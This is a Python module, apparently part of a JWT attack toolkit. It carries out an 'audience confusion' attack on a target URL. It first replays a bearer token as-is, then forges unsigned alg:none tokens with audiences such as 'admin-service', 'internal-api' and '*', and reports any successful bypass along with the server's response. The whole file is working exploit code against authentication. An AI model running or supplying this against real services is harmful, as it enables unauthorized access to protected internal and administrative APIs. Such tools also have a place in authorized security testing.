import requests
import json
from utils import print_info, print_success, print_error
import forge_claims

def run(token: str, target: str):
    print_info(f"Executing Audience Confusion Attack against {target}")
    
    # We will try to access the target using the token as-is, then try to modify the audience
    print_info("Testing original token...")
    try:
         resp = requests.get(target, headers={"Authorization": f"Bearer {token}"}, timeout=5)
         if resp.status_code == 200:
             print_success("Target accepted original token! (Missing audience validation)")
             return
         else:
             print_error(f"Original token rejected: Status {resp.status_code}")
    except requests.ConnectionError:
        print_error(f"Failed to connect to {target}")
        return

    print_info("Forging token with different audiences using alg:none...")
    audiences_to_test = ["admin-service", "billing-service", "internal-api", "*"]
    
    for aud in audiences_to_test:
        print_info(f"Testing aud='{aud}'...")
        try:
             forged_token = forge_claims.forge_none(token, {"aud": aud})
             resp = requests.get(target, headers={"Authorization": f"Bearer {forged_token}"}, timeout=5)
             
             if resp.status_code == 200:
                 print_success(f"🚨 Bypass successful with aud='{aud}'!")
                 print_success(f"Response: {resp.text.strip()}")
             else:
                 print_error(f"Failed: Status {resp.status_code}")
                 
        except Exception as e:
            print_error(f"Error during test: {e}")
